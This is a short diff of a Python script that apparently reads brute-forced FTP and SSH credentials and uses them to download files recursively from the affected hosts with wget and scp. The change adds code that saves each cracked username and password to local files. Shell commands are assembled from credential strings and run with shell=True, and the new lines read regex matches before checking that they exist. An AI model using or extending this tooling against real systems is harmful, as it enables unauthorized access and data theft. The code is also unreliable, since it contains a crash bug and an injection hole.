@@ -46,7 +46,7 @@ def get_ftp_files(ip, username, password, filepath=None, recursion_depth=5, verb
 	# get = "curl ftp://" + username + ":" + password + "@" + ip + filepath + " -o " + filename + ";"
 	get = "wget ftp://" + username + ":" + password + "@" + ip + filepath + " -r -l " + str(recursion_depth + 1) + ";"
 	cmd = mkdir + get
-	devnull = subprocess.STDOUT if verbose else open(os.devnull, 'w')
+	devnull = subprocess.STDOUT if verbose else open(os.devnull, 'w') # inspired by stack overflow
 	if verbose:
 		proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True)
 	else:
@@ -109,6 +109,8 @@ _|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|    \n \
 			for line in f:
 				regex = re.compile(r"Host: (.+) User: (.+) Password: (.+) ")
 				match = regex.search(line)
+				with open("ftp_cracked", "a+") as cracked:
+					cracked.write(match.group(2) + ":" + match.group(3))
 				if match is not None:
 					print("\tgrabbing ftp files from " + str(match.group(2)))
 					if not args.filepath:
@@ -126,6 +128,8 @@ _|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|    \n \
 			for line in f:
 				regex = re.compile(r"Host: (.+) User: (.+) Password: (.+) ")
 				match = regex.search(line)
+				with open("ssh_cracked", "a+") as cracked:
+					cracked.write(match.group(2) + ":" + match.group(3))
 				if match is not None:
 					print("\tgrabbing scp files from " + str(match.group(2)))
 					if not args.filepath:
@@ -135,7 +139,7 @@ _|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|    \n \
 					else: 
 						get_ssh_files(match.group(1), match.group(2), match.group(3), args.filepath)
 
-	print("Elapsed time: ", time.time() - start_time)
+	print("Elapsed time: ", time.time() - start_time, 's')
 # maybe use this vvv for ssh
 # sshpass -p 'SuperStrongPassword' scp -C -r admin@192.168.111.142:/home/admin .
 
